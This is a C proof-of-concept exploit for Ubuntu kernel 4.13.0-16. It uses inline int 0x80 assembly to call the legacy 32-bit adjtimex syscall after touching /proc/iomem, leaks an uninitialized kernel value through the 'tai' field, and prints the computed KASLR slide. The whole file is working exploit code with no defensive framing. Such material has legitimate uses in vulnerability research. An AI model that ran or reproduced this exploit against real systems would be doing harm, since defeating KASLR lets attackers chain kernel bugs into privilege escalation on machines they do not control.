#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

// Ubuntu 4.13.0-16-generic
// gcc -o poc poc.c

typedef unsigned int             compat_size_t;
typedef int             compat_ssize_t;
typedef int             compat_time_t;
typedef int             compat_clock_t;
typedef int             compat_pid_t;
typedef unsigned short             __compat_uid_t;
typedef unsigned short             __compat_gid_t;
typedef unsigned int             __compat_uid32_t;
typedef unsigned int             __compat_gid32_t;
typedef unsigned short             compat_mode_t;
typedef unsigned int             compat_ino_t;
typedef unsigned short             compat_dev_t;
typedef int             compat_off_t;
typedef unsigned long             compat_loff_t;
typedef unsigned short             compat_nlink_t;
typedef unsigned short             compat_ipc_pid_t;
typedef int             compat_daddr_t;
typedef unsigned int             compat_caddr_t;
typedef unsigned long compat_fsid_t;
typedef int             compat_timer_t;
typedef int             compat_key_t;

typedef int             compat_int_t;
typedef int             compat_long_t;
typedef unsigned int             compat_uint_t;
typedef unsigned int             compat_ulong_t;
typedef unsigned int             compat_uptr_t;

struct compat_timeval {
        compat_time_t   tv_sec;
        int             tv_usec;
};

struct compat_timex {
        compat_uint_t modes;
        compat_long_t offset;
        compat_long_t freq;
        compat_long_t maxerror;
        compat_long_t esterror;
        compat_int_t status;
        compat_long_t constant;
        compat_long_t precision;
        compat_long_t tolerance;
        struct compat_timeval time;
        compat_long_t tick;
        compat_long_t ppsfreq;
        compat_long_t jitter;
        compat_int_t shift;
        compat_long_t stabil;
        compat_long_t jitcnt;
        compat_long_t calcnt;
        compat_long_t errcnt;
        compat_long_t stbcnt;
        compat_int_t tai;

        compat_int_t:32; compat_int_t:32; compat_int_t:32; compat_int_t:32;
        compat_int_t:32; compat_int_t:32; compat_int_t:32; compat_int_t:32;
        compat_int_t:32; compat_int_t:32; compat_int_t:32;
};

#define NR_adjtimex32 124
struct compat_timex *time = NULL;

int adjtimex_by_legacy_call(void)
{
	int r = -1;

	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"push %%rdi\n"
		"mov %1, %%eax\n"
		"mov %2, %%ebx\n"
		"int $0x80\n"
		"mov %%eax, %0\n"
		"pop %%rdi\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		: "=r" (r)
		: "r"(NR_adjtimex32), "r"((unsigned int)time)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi", "rdi"
	);

	printf("leak_value : %lx\n", time->tai);
	return time->tai;
}

void put_kptr(void)
{
	access("/proc/iomem", R_OK);
}

int main(int argc, char **argv)
{
	int r;
	unsigned long leak_offset, stack_offset, kaslr;
	unsigned int leak_value;
	unsigned int high = 0xffffffff;

	time = mmap(0x70000, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (time == MAP_FAILED) {
		printf("mmap error : %d, %s\n", errno, strerror(errno));
		return -1;
	}
	memset(time, 0 ,sizeof(*time));
	time->modes = 0x8000;

    // put sensitive kernel pointer on the leak offset
	put_kptr();

    // trigger vulnerability
	leak_value = adjtimex_by_legacy_call();

    // print KASLR slide ("_text" symbol address) using leak_value
	printf("leak_value : %lx\n", leak_value);
	memcpy(&kaslr, &leak_value, 4);
	memcpy((char *)&kaslr + 4, &high, 4);
	printf("KASLR Slide : %lx\n", kaslr & (~(0xfffff)));

	return 0;
}
